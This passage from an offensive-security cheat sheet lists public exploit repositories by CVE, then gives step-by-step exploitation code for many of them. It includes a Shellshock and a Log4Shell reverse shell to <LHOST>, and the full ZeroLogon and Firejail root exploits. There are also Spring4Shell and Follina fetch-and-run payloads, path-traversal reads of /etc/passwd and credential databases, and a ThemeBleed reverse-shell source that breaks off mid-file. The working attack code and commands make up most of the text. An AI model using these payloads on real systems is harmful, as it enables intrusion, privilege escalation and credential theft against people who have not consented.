| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
| CVE-2023-28252 | Windows Common Log File System Driver LPE | https://github.com/fortra/CVE-2023-28252 |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| CVE-2023-29357 | Microsoft SharePoint Server LPE | https://github.com/Chocapikk/CVE-2023-29357 |
| CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
| CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
| CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
| CVE-2023-38146 | ThemeBleed RCE | https://github.com/gabe-k/themebleed |
| CVE-2023-38831 | WinRAR Exploit (0-day) | https://github.com/b1tg/CVE-2023-38831-winrar-exploit |
| CVE-2023-43641 | GNOME libcue RCE | https://github.com/github/securitylab/tree/0a8ede65e0ac860d195868b093d3ddcbd00e6997/SecurityExploits/libcue/track_set_index_CVE-2023-43641 |
| CVE-2023-46604 | Apache ActiveMQ OpenWire Transport RCE | https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ |
| CVE-2023-4911 | Looney Tunables LPE | https://github.com/RickdeJager/CVE-2023-4911 |
| CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
| CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (1) | https://github.com/duy-31/CVE-2024-21413 |
| CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (2) | https://github.com/CMNatic/CVE-2024-21413 |
| CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (3) | https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability |
| CVE-2024-21626 | Leaky Vessels Container Escape (1) | https://github.com/Wall1e/CVE-2024-21626-POC |
| CVE-2024-21626 | Leaky Vessels Container Escape (2) | https://github.com/NitroCao/CVE-2024-21626 |
| CVE-2024-28897 | Jenkins Arbitrary File Read | https://github.com/CKevens/CVE-2024-23897 |
| n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
| n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
| n/a | ADCSCoercePotato | https://github.com/decoder-it/ADCSCoercePotato |
| n/a | CoercedPotato LPE | https://github.com/Prepouce/CoercedPotato |
| n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 LPE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | SystemNightmare LPE | https://github.com/GossiTheDog/SystemNightmare |
| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

## CVE-2005-4890: TTY Hijacking / TTY Input Pushback via TIOCSTI

> https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking

```c
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "exit\ncp /bin/bash /tmp/bash; chmod u+s /tmp/bash\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
```

```c
$ gcc <FILE>.c -static
```

## CVE-2014-6271: Shellshock RCE PoC

```c
$ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
```

## CVE-2016-1531: exim LPE

- exim version <= 4.84-3

```c
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

## CVE-2019-14287: Sudo Bypass

> https://www.exploit-db.com/exploits/47502

### Prerequisites

- Sudo version < 1.8.28

### Exploitation

```c
!root:
$ sudo -u#-1 /bin/bash
```

## CVE-2020-1472: ZeroLogon LPE

> https://github.com/SecuraBV/CVE-2020-1472

> https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py

### Prerequisites

```c
$ python3 -m pip install virtualenv
$ python3 -m virtualenv venv
$ source venv/bin/activate
$ pip install git+https://github.com/SecureAuthCorp/impacket
```

### PoC Modification

```c
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
```

### Weaponized PoC

```c
#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if not rpc_con:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
```

### Execution

```c
$ python3 zerologon_tester.py <HANDLE> <RHOST>
$ secretsdump.py -just-dc -no-pass <HANDLE>\$@<RHOST>
```

## CVE-2021-3156: Sudo / sudoedit LPE

> https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435

### Pre-requisistes

- Ubuntu 20.04 (Sudo 1.8.31)
- Debian 10 (Sudo 1.8.27)
- Fedora 33 (Sudo 1.9.2)
- All legacy versions >= 1.8.2 to 1.8.31p2 and all stable versions >= 1.9.0 to 1.9.5p1

### Vulnerability Test

```c
$ sudoedit -s /
```

The machine is vulnerable if one of the following message is shown.

```c
sudoedit: /: not a regular file
segfault
```

Not vulnerable if the error message starts with `usage:`.

## CVE-2021-41773, CVE-2021-42013, CVE-2020-17519: Simples Apache Path Traversal (0-day)

```c
$ curl --data "echo;id" 'http://127.0.0.1:55026/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

```c
$ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
```

## CVE-2021-43798: Grafana Directory Traversal and Arbitrary File Read (0-day)

> https://vulncheck.com/blog/grafana-cve-2021-43798

### Pre-requisistes

- Grafana 8.0.0-beta1 > 8.3.0

### Execution

```c
$ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../etc/passwd' --path-as-is
$ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db
```

## CVE-2021-44228: Log4Shell RCE (0-day)

### Testing

```c
$ cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
```

### Pre-requisistes

> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

File: jdk-8u181-linux-x64.tar.gz

### Creating Library Folder

```c
$ sudo mkdir /usr/lib/jvm
$ cd /usr/lib/jvm
$ sudo tar xzvf /usr/lib/jvm/jdk-8u181-linux-x64.tar.gz
$ sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
$ sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
$ sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
$ sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
$ sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
$ sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
```

### Verify Version

```c
$ java -version
```

### Get Exploit Framework

```c
$ git clone https://github.com/mbechler/marshalsec
$ cd /opt/08_exploitation_tools/marshalsec/
$ sudo apt-get install maven
$ mvn clean package -DskipTests
```

### Exploit.java

```c
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <LHOST> <LPORT>");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### Compiling Exploit.java

```c
$ javac Exploit.java -source 8 -target 8
```

### Start Pyhton3 HTTP Server

```c
$ python3 -m http.server 80
```

### Starting the malicious LDAP Server

```c
$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<LHOST>:80/#Exploit"
```

### Start local netcat listener

```c
$ nc -lnvp 9001
```

### Execution

```c
$ curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Exploit\}'
```

#### Automatic Exploitation

> https://github.com/welk1n/JNDI-Injection-Exploit

```c
$ wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
```

```c
$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<COMMAND>"
```

```c
${jndi:ldap://<LHOST>:1389/ci1dfd}
```

#### Automatic Exploitation Alternative

> https://github.com/kozmer/log4j-shell-poc

##### Pre-requisistes

> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

```c
$ tar -xvf jdk-8u20-linux-x64.tar.gz
```

##### Start the Listener

```c
$ python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>                                   
```

##### Execution

```c
${jndi:ldap://<LHOST>:1389/foobar}
```

## CVE-2022-0847: Dirty Pipe LPE

```c
$ gcc -o dirtypipe dirtypipe.c
$ ./dirtypipe /etc/passwd 1 ootz:
$ su rootz
```

## CVE-2022-1040: Sophos XG Authentication Bypass RCE

```c
$ curl -sk -H "X-Requested-With: XMLHttpRequest" -X POST 'https://<RHOST>/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"x":"foobar"\}' | grep -q 'Session Expired'
```

## CVE-2022-21675: Zip Slip

```c
$ ln -s ../../../../../../../../../../etc/passwd <FILE>.pdf
$ zip --symlink <FILE>.zip <FILE>.pdf
$ curl http://<RHOST>/<FILE>.pdf
```

## CVE-2022-22963: Spring4Shell RCE (0-day)

> https://github.com/me2nuk/CVE-2022-22963

```c
$ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
```

```c
$ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
```

## CVE-2022-30190: MS-MSDT Follina RCE

> https://github.com/JohnHammond/msdt-follina

```c
$ python3 follina.py -p 80 -c 'powershell.exe Invoke-WebRequest http://<LHOST>:8000/nc64.exe -OutFile C:\\Windows\\Tasks\\nc64.exe; C:\\Windows\\Tasks\\nc64.exe -e cmd.exe <LHOST> <LPORT>'
```

```c
$ python3 -m http.server 8000
```

```c
$ nc -lnvp <LPORT>
```

```c
$ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
```

## CVE-2022-31214: Firejail LPE

> https://seclists.org/oss-sec/2022/q2/188

> https://www.openwall.com/lists/oss-security/2022/06/08/10

```c
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner () suse com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

#### First Terminal

```c
$ ./firejoin_py.bin
You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

#### Second Terminal

```c
$ firejail --join=193982
$ su
```

## CVE-2022-44268: ImageMagick Arbitrary File Read PoC

> https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC

```c
$ sudo apt-get install pngcrush imagemagick exiftool exiv2
```

```c
$ pngcrush -text a "profile" "<FILE>" <FILE.png
```

```c
-----------------------------299057355710558143811161967686
Content-Disposition: form-data; name="srcFormat"

png:- -write uploads/<FILE>.png
```

### Decoding Output

> https://cyberchef.org/#recipe=From_Hex(%27Auto%27)

## CVE-2023-0126: SonicWall SMA1000 Pre-Authentication Path Traversal Vulnerability

- Firmware 12.4.2

```c
$ cat <FILE> | while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULNERABLE";done
```

## CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)

### PoC 1

```c
{% highlight Python %}
#!/usr/bin/python
#
# PoC for:
# Microsoft Word RTF Font Table Heap Corruption Vulnerability
#
# by Joshua J. Drake (@jduck)
#

import sys

# allow overriding the number of fonts
num = 32761
if len(sys.argv) > 1:
  num = int(sys.argv[1])

f = open("tezt.rtf", "wb")
f.write("{\\rtf1{\n{\\fonttbl")
for i in range(num):
  f.write("{\\f%dA;}\n" % i)
f.write("}\n")
f.write("{\\rtlch it didn't crash?? no calc?! BOO!!!}\n")
f.write("}}\n")
f.close()
{% endhighlight %}
```

### PoC 2

```c
open("t3zt.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ]) + "}\n{\\rtlch no crash??}\n}}\n").encode('utf-8'))
```

## CVE-2023-21746: Windows NTLM EoP LocalPotato LPE

> https://github.com/decoder-it/LocalPotato

> https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc

Modify the following file and build the solution.

```c
StorSvc\RpcClient\RpcClient\storsvc_c.c
```

```c
#if defined(_M_AMD64)

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022
```

Modify the following file and build the solution.

```c
StorSvc\SprintCSP\SprintCSP\main.c
```

```c
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```

First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.

```c
C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
C:\> LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
```

At least trigger `StorSvc` via `RpcClient.exe`.

```c
C:\> RpcClient.exe
```

## CVE-2023-22515: Confluence Server and Confluence Data Center Broken Access Control (0-day)

> https://github.com/Chocapikk/CVE-2023-22515

### Manual Exploitation

```c
http://<RHOST>/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
http://<RHOST>/setup/setupadministrator-start.action
```

```c
$ curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fullName=admin&email=admin@confluence&password=adm1n&confirm=adm1n&setup-next-button=Next" http://<RHOST>/setup/setupadministrator.action
```

## CVE-2023-22809: Sudo Bypass LPE

> https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466

### Prerequisites

- Sudo version needs to be ≥ 1.8 and < 1.9.12p2.
- Limited Sudo access to at least one file on the system that requires root access.

### Example

```c
test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
```

### Exploitation

```c
EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
```

```c
$ sudoedit /etc/motd
```

## CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)

```c
PS C:\> Import-Module .\CVE-2023-23397.ps1
PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
```

## CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)

> https://twitter.com/liadeliyahu/status/1684841527959273472?s=09

- Linux ubuntu2204 5.19.0-46-generic

```c
$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

```c
$ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'
```

## CVE-2023-38146: ThemeBleed RCE

> https://github.com/gabe-k/themebleed

Create a new `C++ Console Application`.

### rev.cpp

Source Files > Add > New Item...

```c
#include "pch.h"
#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#pragma comment(lib, "Ws2_32.lib")
#include "rev.h"
using namespace std;

void rev_shell()
{
  FreeConsole();

  const char* REMOTE_ADDR = "<LHOST>";
  const char* REMOTE_PORT = "<LPORT>";

  WSADATA wsaData;
